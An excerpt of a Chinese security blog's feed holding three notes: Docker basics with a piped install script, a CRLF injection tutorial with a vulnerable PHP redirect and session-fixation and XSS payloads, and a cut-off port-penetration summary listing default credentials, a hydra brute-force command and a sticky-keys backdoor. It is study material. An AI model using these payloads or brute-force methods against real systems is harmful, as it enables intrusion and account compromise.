      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker基础与实战</title>
    <link href="http://uknowsec.cn/posts/notes/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E6%88%98.html"/>
    <id>http://uknowsec.cn/posts/notes/Docker基础与实战.html</id>
    <published>2017-09-14T10:54:55.000Z</published>
    <updated>2017-09-14T13:25:24.692Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>Linux中两种Docker安装方法，一种是使用Docker提供的自动安装脚本，另一种是使用Linux发行版的packaging system直接安装</p>
<h3 id="自动安装脚本"><a href="#自动安装脚本" class="headerlink" title="自动安装脚本"></a>自动安装脚本</h3><p>Docker自动识别Linux发行版的类型，提供用于安装Docker包的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo wget -q0- https://get.docker.com/ | sh</div></pre></td></tr></table></figure>
<p>使用get.docker.com脚本安装Docker时，hello-world镜像也会自动安装。由于不使用hello-world镜像，故将其全部删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo docker rm `sudo docker ps -aq`</div><div class="line">sudo docker rmi hello-world</div></pre></td></tr></table></figure>
<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install docker.io</div><div class="line">sudo ln -sf /usr/bin/docker.io /usr/local/bin/docker</div></pre></td></tr></table></figure>
<p>将/usr/bin/docker.io可执行文件链接到/usr/local/bin/docker并使用</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/boot2docker/windows-installer/releases</div></pre></td></tr></table></figure>
<h1 id="使用Docker"><a href="#使用Docker" class="headerlink" title="使用Docker"></a>使用Docker</h1><p>Docker命令格式为docker&lt;命令&gt;,比如docker run、docker push，且必须总是以root权限运行</p>
<h2 id="使用search命令搜索镜像"><a href="#使用search命令搜索镜像" class="headerlink" title="使用search命令搜索镜像"></a>使用search命令搜索镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker search ubuntu</div></pre></td></tr></table></figure>
<h2 id="使用pull命令下载镜像"><a href="#使用pull命令下载镜像" class="headerlink" title="使用pull命令下载镜像"></a>使用pull命令下载镜像</h2><p>从Docker hub下载Ubuntu Linux镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker pull ubuntu:latest</div></pre></td></tr></table></figure>
<h2 id="使用images命令列出镜像目录"><a href="#使用images命令列出镜像目录" class="headerlink" title="使用images命令列出镜像目录"></a>使用images命令列出镜像目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker images</div></pre></td></tr></table></figure>
<p>docker images命令用于列出本地主机中所有镜像。在该命令中设置镜像名称—比如docker images ubuntu—则只列出名称相同但标签不同的镜像</p>
<h2 id="使用run命令创建容器"><a href="#使用run命令创建容器" class="headerlink" title="使用run命令创建容器"></a>使用run命令创建容器</h2><p>使用镜像创建容器后，运行Bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker run -i -t --name hello ubuntu /bin/bash</div></pre></td></tr></table></figure>
<p>命令格式为docker run&lt;选项&gt;&lt;镜像名称&gt;&lt;要运行的文件&gt;。将ubuntu镜像创建为容器后，运行ubuntu镜像中的/bin/bash。也可以不用镜像名称而用镜像ID</p>
<ul>
<li>使用 -i(interactive)、-t(Pseudo-tty)选项可以在运行的Bash shell中进行输入与输出</li>
<li>使用 –name选项可以指定容器名称。若不指定名称，Docker会自动生成名称并进行指定</li>
</ul>
<h2 id="使用ps命令查看容器列表"><a href="#使用ps命令查看容器列表" class="headerlink" title="使用ps命令查看容器列表"></a>使用ps命令查看容器列表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker ps -a</div></pre></td></tr></table></figure>
<h2 id="使用start命令启动容器"><a href="#使用start命令启动容器" class="headerlink" title="使用start命令启动容器"></a>使用start命令启动容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker start hello</div></pre></td></tr></table></figure>
<p>命令格式为docker start&lt;容器名称&gt;,也可以使用容器ID替代容器名称</p>
<h2 id="使用restart命令重启容器"><a href="#使用restart命令重启容器" class="headerlink" title="使用restart命令重启容器"></a>使用restart命令重启容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker restart hello</div></pre></td></tr></table></figure>
<p>命令格式为docker restart&lt;容器名称&gt;,也可以使用容器ID替代容器名称</p>
<h2 id="使用attach命令连接容器"><a href="#使用attach命令连接容器" class="headerlink" title="使用attach命令连接容器"></a>使用attach命令连接容器</h2><p>执行如下命令后，再输入一次回车键，显示Bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker attach hello</div></pre></td></tr></table></figure>
<p>命令格式为docker attach&lt;容器名称&gt;,也可以使用容器ID替代容器名称<br>在Bash shell中输入exit或Ctrl+D终止容器，若依次输入Ctrl+P、Ctrl+Q则不会终止容器而只退出</p>
<h2 id="使用exec命令从外部运行容器内的命令"><a href="#使用exec命令从外部运行容器内的命令" class="headerlink" title="使用exec命令从外部运行容器内的命令"></a>使用exec命令从外部运行容器内的命令</h2><p>当前容器正以/bin/bash形式处于运行状态，也可以不通过/bin/bash而从外部运行容器内的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker exec hello echo &quot;Hello World&quot;</div></pre></td></tr></table></figure></p>
<p>命令格式为docker exec&lt;容器名称&gt;&lt;命令&gt;&lt;形式参数&gt;,也可以使用容器ID替代容器名称。</p>
<h2 id="使用stop命令终止容器"><a href="#使用stop命令终止容器" class="headerlink" title="使用stop命令终止容器"></a>使用stop命令终止容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker stop hello</div></pre></td></tr></table></figure>
<h2 id="使用rm命令删除容器"><a href="#使用rm命令删除容器" class="headerlink" title="使用rm命令删除容器"></a>使用rm命令删除容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker rm hello</div></pre></td></tr></table></figure>
<p>命令格式为docker rm&lt;容器名称&gt;,也可以使用容器ID替代容器名称。</p>
<h2 id="使用rmi命令删除镜像"><a href="#使用rmi命令删除镜像" class="headerlink" title="使用rmi命令删除镜像"></a>使用rmi命令删除镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker rmi ubuntu:latest</div></pre></td></tr></table></figure>
<p>命令格式为docker rm&lt;镜像名称&gt;:&lt;标签&gt;,也可以使用容器ID替代容器名称。</p>
<h1 id="创建Docker镜像"><a href="#创建Docker镜像" class="headerlink" title="创建Docker镜像"></a>创建Docker镜像</h1><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><blockquote>
<p>example/Dockerfile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">FROM ubuntu:14.04</div><div class="line">MAINTAINER Foo Bar &lt;foo@bar.com&gt;</div><div class="line"></div><div class="line">RUN apt-get update</div><div class="line">RUN apt-get install -y nginx</div><div class="line">RUN echo &quot;\ndaemon off;&quot; &gt;&gt; /etc/nginx/nginx.conf</div><div class="line">RUN chown -R www-date:www-date /var/lib/nginx</div><div class="line"></div><div class="line">VOLUME [&quot;/date&quot;, &quot;/etc/nginx/site-enabled&quot;, &quot;/var/log/nginx&quot;]</div><div class="line"></div><div class="line">WORKDIR /etc/nginx</div><div class="line"></div><div class="line">CMD [&quot;nginx&quot;]</div><div class="line"></div><div class="line">EXPOSE 80</div><div class="line">EXPOSE 443</div></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>FROM:指定基于的基础镜像。Docker镜像基于已创建的镜像。指令格式为&lt;镜像名称&gt;&lt;标签&gt;</li>
<li>MAINTAINER:维护者信息</li>
<li>RUN:运行shell脚本或命令</li>
<li>CMD:指定容器启动时执行的文件或shell脚本</li>
<li>WORKDIR:为CMD中设置的可执行文件设置运行目录</li>
<li>EXPOSE:与主机相连的端口号</li>
</ul>
<h2 id="使用build命令创建镜像"><a href="#使用build命令创建镜像" class="headerlink" title="使用build命令创建镜像"></a>使用build命令创建镜像</h2><p>Dockerfile文件编写完成后，在保存Dockerfile文件的example目录执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker build --tag hello:0.1</div></pre></td></tr></table></figure></p>
<p>命令格式为docker build &lt;选项&gt;<dockerfile 路径="">。使用–tag选项可以设置镜像名称与标签。</dockerfile></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker run --name hello-nginx -d -p 80:80 -v /root/data:/data hello:0.1</div></pre></td></tr></table></figure>
<ul>
<li>-d 选项在后台运行容器</li>
<li>-p 80:80选项将主机的80端口与容器的80端口连接起来，并暴露到外部。这样设置后，连接http://&lt;主机IP&gt;:80就会连接到容器的80号端口</li>
<li>-v /root/data:/data选项将主机的/root/data目录连接到容器的/data目录。若将文件放入/root/data目录，则能从容器读取相应文件。</li>
</ul>
<h1 id="查看Docker"><a href="#查看Docker" class="headerlink" title="查看Docker"></a>查看Docker</h1><h2 id="使用history命令查看镜像历史"><a href="#使用history命令查看镜像历史" class="headerlink" title="使用history命令查看镜像历史"></a>使用history命令查看镜像历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker history hello:0.1</div></pre></td></tr></table></figure>
<p>命令格式为docker history&lt;镜像名称&gt;:&lt;标签&gt;</p>
<h2 id="使用cp命令复制文件"><a href="#使用cp命令复制文件" class="headerlink" title="使用cp命令复制文件"></a>使用cp命令复制文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker cp hello-nginx:/etc/nginx/nginx.conf ./</div></pre></td></tr></table></figure>
<p>命令格式为docker cp&lt;容器名称&gt;:&lt;路径&gt;&lt;主机路径&gt;</p>
<h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
<p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
<p>-a “Foo Bar<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#102;&#x6f;&#x6f;&#x40;&#x62;&#x61;&#114;&#x2e;&#x63;&#x6f;&#109;">&#102;&#x6f;&#x6f;&#x40;&#x62;&#x61;&#114;&#x2e;&#x63;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
<h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
<p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
<h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
<p>命令格式为docker inspect&lt;容器名称&gt;</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>CRLF Injection漏洞利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/CRLF-Injection%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/CRLF-Injection漏洞利用与学习.html</id>
    <published>2017-08-24T04:48:23.000Z</published>
    <updated>2017-08-25T06:39:14.805Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="CRLF简介"><a href="#CRLF简介" class="headerlink" title="CRLF简介"></a>CRLF简介</h2><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="PHP-header-函数"><a href="#PHP-header-函数" class="headerlink" title="PHP header() 函数"></a>PHP header() 函数</h3><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<p>认识到一点很重要，即必须在任何实际的输出被发送之前调用 header() 函数（在 PHP 4 以及更高的版本中，您可以使用输出缓存来解决此问题）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 结果出错</div><div class="line">// 在调用 header() 之前已存在输出</div><div class="line">header(&apos;Location: http://www.example.com/&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(string,replace,http_response_code)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h4 id="提示和注释"><a href="#提示和注释" class="headerlink" title="提示和注释"></a>提示和注释</h4><p>注释：从 PHP 4.4 之后，该函数防止一次发送多个报头。这是对头部注入攻击的保护措施。</p>
<h3 id="URL重定向-跳转"><a href="#URL重定向-跳转" class="headerlink" title="URL重定向/跳转"></a>URL重定向/跳转</h3><p>对于URL跳转的实现一般会有几种实现方式：</p>
<ul>
<li>META标签内跳转</li>
<li>javascript跳转</li>
<li>header头跳转</li>
</ul>
<p>通过以GET或者POST的方式接收将要跳转的URL，然后通过上面的几种方式的其中一种来跳转到目标URL。一方面，由于用户的输入会进入Meta，javascript，http头所以都可能发生相应上下文的漏洞，如xss等等，但是同时，即使只是对于URL跳转本身功能方面就存在一个缺陷，因为会将用户浏览器从可信的站点导向到不可信的站点，同时如果跳转的时候带有敏感数据一样可能将敏感数据泄漏给不可信的第三方。</p>
<p>譬如一个典型的登录跳转如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$url=$_GET[&apos;jumpto&apos;];</div><div class="line"></div><div class="line">header(&quot;Location: $url&quot;);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>如果jumpto没有任何限制，所以恶意用户可以提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.wooyun.org/login.php?jumpto=http://www.evil.com</div></pre></td></tr></table></figure></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>利用CRLF Injection设置一个SESSION,造成一个“会话固定漏洞”</li>
<li>利用CRLF Injection造成一个无视浏览器Filter的反射型XSS</li>
</ul>
<h3 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h3><p>一般网站会在HTTP头中用Location: <a href="http://baidu.com" target="_blank" rel="external">http://baidu.com</a> 这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</p>
<p>所以一个正常的302跳转包是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily </div><div class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </div><div class="line">Content-Type: text/html </div><div class="line">Content-Length: 154 </div><div class="line">Connection: close </div><div class="line">Location: http://www.sina.com.cn</div></pre></td></tr></table></figure></p>
<p>但如果我们输入的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun</div></pre></td></tr></table></figure></p>
<p>注入了一个换行，此时的返回包就会变成这样： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily </div><div class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </div><div class="line">Content-Type: text/html </div><div class="line">Content-Length: 154 </div><div class="line">Connection: close </div><div class="line">Location: http://www.sina.com.cn </div><div class="line">Set-cookie: JSPSESSID=wooyun</div></pre></td></tr></table></figure>
<p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p>
<h3 id="过Filter的反射型XSS"><a href="#过Filter的反射型XSS" class="headerlink" title="过Filter的反射型XSS"></a>过Filter的反射型XSS</h3><p>HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>比如一个网站接受url参数 <a href="http://test.sina.com.cn/?url=xxx" target="_blank" rel="external">http://test.sina.com.cn/?url=xxx</a> ，xxx放在Location后面作为一个跳转。如果我们输入的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://test.sina.com.cn/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</div></pre></td></tr></table></figure></p>
<p>我们的返回包就会变成这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily </div><div class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </div><div class="line">Content-Type: text/html </div><div class="line">Content-Length: 154 </div><div class="line">Connection: close </div><div class="line">Location:</div><div class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</div></pre></td></tr></table></figure>
<p>之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。</p>
<p>为什么说是无视浏览器filter的，这里涉及到另一个问题。</p>
<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
<p>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wooyun.jozxing.cc/static/drops/papers-2466.html" target="_blank" rel="external">CRLF Injection漏洞的利用与实例分析</a><br><a href="http://wooyun.jozxing.cc/static/drops/papers-58.html" target="_blank" rel="external">URL重定向/跳转漏洞</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>端口渗透总结</title>
    <link href="http://uknowsec.cn/posts/notes/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/端口渗透总结.html</id>
    <published>2017-08-21T09:35:53.000Z</published>
    <updated>2017-08-25T02:34:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
<h2 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h2><h3 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a>FTP服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<h4 id="默认端口："><a href="#默认端口：" class="headerlink" title="默认端口："></a>默认端口：</h4><p>20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
<h4 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</li>
<li>匿名访问：用户名：anonymous  密码：为空或任意邮箱</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">用户名：FTP            密码：FTP或为空</div><div class="line">用户名：USET         密码：pass</div><div class="line">当然还有不需要用户名密码直接访问的，一般出现在局域网中</div></pre></td></tr></table></figure>
<h3 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h3><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
<h4 id="默认端口：2049"><a href="#默认端口：2049" class="headerlink" title="默认端口：2049"></a>默认端口：2049</h4><h4 id="攻击方式：-1"><a href="#攻击方式：-1" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>未授权访问：未限制IP以及用户权限设置错误 </li>
</ul>
<h3 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h3><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
<h4 id="默认端口：-1"><a href="#默认端口：-1" class="headerlink" title="默认端口："></a>默认端口：</h4><p>137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
<h4 id="攻击方式：-2"><a href="#攻击方式：-2" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（爆破工具采用hydra）hydra -l username -P PassFile IP smb</li>
<li>未授权访问：给予public用户高权限</li>
<li>远程代码执行漏洞：CVE-2015-0240等等</li>
</ul>
<h3 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h3><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
<h4 id="默认端口：389"><a href="#默认端口：389" class="headerlink" title="默认端口：389"></a>默认端口：389</h4><h4 id="攻击方式：-3"><a href="#攻击方式：-3" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>注入攻击：盲注</li>
<li>未授权访问：</li>
<li>爆破：弱口令</li>
</ul>
<h2 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h2><h3 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h3><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
<h4 id="默认端口：22"><a href="#默认端口：22" class="headerlink" title="默认端口：22"></a>默认端口：22</h4><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>爆破：弱口令、</li>
<li>漏洞：28退格漏洞、OpenSSL漏洞</li>
</ul>
<h3 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h3><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
<h4 id="默认端口：23"><a href="#默认端口：23" class="headerlink" title="默认端口：23"></a>默认端口：23</h4><h4 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>爆破：弱口令</li>
<li>嗅探：此种情况一般发生在局域网；</li>
</ul>
<h3 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h3><p>远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
<h4 id="默认端口：3389"><a href="#默认端口：3389" class="headerlink" title="默认端口：3389"></a>默认端口：3389</h4><h4 id="攻击方式：-4"><a href="#攻击方式：-4" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：3389端口爆破工具就有点多了</li>
<li>Shift粘滞键后门：5次shift后门</li>
<li>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；请参考</li>
</ul>
<h3 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h3><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
